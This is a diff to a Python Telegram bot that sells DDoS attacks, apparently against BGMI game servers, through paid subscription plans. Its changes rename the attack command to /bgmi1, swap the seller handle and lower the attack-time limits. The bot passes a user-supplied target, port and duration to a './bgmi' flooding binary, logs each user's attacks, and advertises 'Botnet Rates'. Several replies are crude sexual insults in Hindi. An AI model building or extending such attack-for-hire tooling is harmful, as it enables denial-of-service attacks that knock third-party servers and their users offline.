@@ -1,3 +1,4 @@
+
 #script by @RitikXyz099
 
 import telebot
@@ -153,7 +154,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
     else:
-        response = "You have not purchased yet purchase now from:- @venomXcrazy."
+        response = "You have not purchased yet purchase now from:- @RitikXyz099."
 
     bot.reply_to(message, response)
 
@@ -189,7 +190,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
 ✅ Usage: /remove <userid>'''
     else:
-        response = "You have not purchased yet purchase now from:- @venomXcrazy 🙇."
+        response = "You have not purchased yet purchase now from:- @RitikXyz099🙇."
 
     bot.reply_to(message, response)
 
@@ -252,7 +253,7 @@ def show_all_users(message):
         except FileNotFoundError:
             response = "No data found ❌"
     else:
-        response = " Pani Kam Hai matke Mein free Walon Tumhari man Chod Dunga Main jhatake mein:- @@RitikXyz099 ❄."
+        response = " Pani Kam Hai matke Mein free Walon Tumhari man Chod Dunga Main jhatake mein:- @RitikXyz099 ❄."
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['logs'])
@@ -274,7 +275,7 @@ def show_recent_logs(message):
         bot.reply_to(message, response)
 
 
-# Function to handle the reply when free users run the /bgmi command
+# Function to handle the reply when free users run the /bgmi1 command
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
@@ -296,7 +297,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                response = " Teri Man ki chut ruk ❌10sec Baad dalna /bgmi Command Again."
+                response = " Teri Man ki chut ruk ❌10sec Baad dalna /bgmi1 Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -307,10 +308,10 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
-            if time > 180:
-                response = "Error: Time interval must be less than 180."
+            if time > 150:
+                response = "Error: Time interval must be less than 150."
             else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
+                record_command_logs(user_id, '/bgmi1', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 110"
@@ -318,7 +319,7 @@ def handle_bgmi(message):
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
-            response = "✅ Usage :- /ritik <target> <port> <time>"  # Updated command syntax
+            response = "✅ Usage :- /bgmi1 <target> <port> <time>"  # Updated command syntax
     else:
         response = ("🚫 tere baap ko bol vah approved kare dega! 🚫\n\n:- @RitikXyz099")
 
@@ -348,7 +349,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /bgmi : Method For Bgmi Servers. 
+💥 /bgmi1 : Method For Bgmi Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
 💥 /plan : Checkout Our Botnet Rates.
@@ -395,7 +396,7 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 300 (S)
+-> Attack Time : 150 (S)
 > After Attack Limit : 10 sec
 -> Concurrents Attack : 5
 
